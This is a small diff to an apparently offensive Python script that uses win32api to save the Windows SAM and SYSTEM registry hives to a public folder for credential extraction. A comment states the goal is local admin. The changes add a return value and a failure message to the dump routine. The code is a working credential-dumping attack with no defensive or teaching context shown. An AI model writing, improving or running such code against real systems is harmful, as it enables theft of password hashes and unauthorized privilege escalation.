@@ -42,6 +42,7 @@ def dumpreg():
     systemhandle=win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, "SYSTEM", 0, win32con.KEY_ALL_ACCESS);
     win32api.RegSaveKey(systemhandle, "c:\\users\\public\\system.save", None);
     win32api.RegCloseKey(systemhandle);
+    return True
     
     #Security File (we dont have permissions to get this by default...but it's really only useful for domain creds and I just want local admin)
     #securityhandle=win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, "SECURITY", 0, win32con.KEY_ALL_ACCESS);
@@ -56,4 +57,6 @@ if not SetBackupPrivilege():
 if dumpreg():
     print("[+] Successfully dumped SAM and SYSTEM!!!\n")
     exit()
+else:
+    print("[!] couldn't dump registry...\n")
 f.close()
